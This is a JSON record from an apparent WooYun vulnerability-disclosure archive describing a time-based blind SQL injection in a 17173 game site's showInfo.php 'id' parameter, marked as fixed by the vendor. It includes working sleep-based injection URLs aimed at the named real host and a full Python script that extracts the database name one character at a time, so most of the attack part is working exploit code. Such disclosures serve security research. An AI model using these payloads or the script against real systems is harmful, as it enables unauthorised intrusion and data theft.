{"id": 47373, "wybug_id": "wooyun-2015-093603", "wybug_title": "17173某站存在SQL盲注漏洞（附验证脚本）", "wybug_corp": "17173游戏", "wybug_author": "星明月稀", "wybug_date": "2015-01-24 12:45", "wybug_open_date": "2015-01-27 10:34", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-27：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 17173某站存在SQL盲注漏洞，附验证脚本。 详细说明：  问题站点：http://ldj.db.17173.com盲注点：http://ldj.db.17173.com/showInfo.php?a=1&id=(sleep(length(database())=6))注入参数：id 存在时间盲注步骤：（1）http://ldj.db.17173.com/showInfo.php?a=1&id=(sleep(length(user())=18))如果猜解错误，则立即返回200；如果响应延迟，返回502，则判断长度为18。（2）http://ldj.db.17173.com/showInfo.php?a=1&id(sleep(ascii(mid(user(),1,1))=116))同理，响应延迟，user(）第一个字符为“t”（3）http://ldj.db.17173.com/showInfo.php?a=1&id=(sleep(ascii(mid(user(),2,1))=111))响应延迟，第二个字符为“o”学下@lijiejie写个脚本验证下！   漏洞证明：  user():\n\ndatabase():\n\n附验证脚本：\n#encoding=utf-8import httplibimport timeimport stringimport sysheaders = {    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36',    'Referer': 'http://ldj.db.17173.com',}payloads = list('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.')print '[%s] Start to retrive MySQL database()' % time.strftime('%H:%M:%S', time.localtime())database = ''for i in range(1,7,1):    for payload in payloads:        try:            conn = httplib.HTTPConnection('ldj.db.17173.com', timeout=5)            conn.request(method='GET', url=\"/showInfo.php?a=1&id=(sleep(ascii(mid(database()from(%s)for(1)))=%s))\" % (i, ord(payload)) )            status = conn.getresponse().status            conn.close()        except:            database += payload            print '\\r[scan in progress]' ,database             time.sleep(0.01)            breakprint ''print 'database() is', database\n   修复方案：  过滤下参数！   版权声明：转载请注明来源 星明月稀@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-01-25 22:23 厂商回复： 谢谢关注，漏洞修复中！ 最新状态： 2015-01-27：更新状态.  ", "replys": "漏洞评价：\n评论\n     2015-01-27 12:28 |    \t\t默之 \t\t\t( 普通白帽子  |\t\t\t        Rank:334 漏洞数:67        | 沉淀。)\t\t \n  猛一看，我以为是lijiejie又发洞了    \n     2015-02-14 17:53 |    \t\t路飞 \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:21        | 上帝恩赐，命运天定。希望之光，普照我身。...)\t\t \n  洞主 print status 直接显示500 而自己在火狐查看网络状态 延迟 200 状态 如何破？     \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}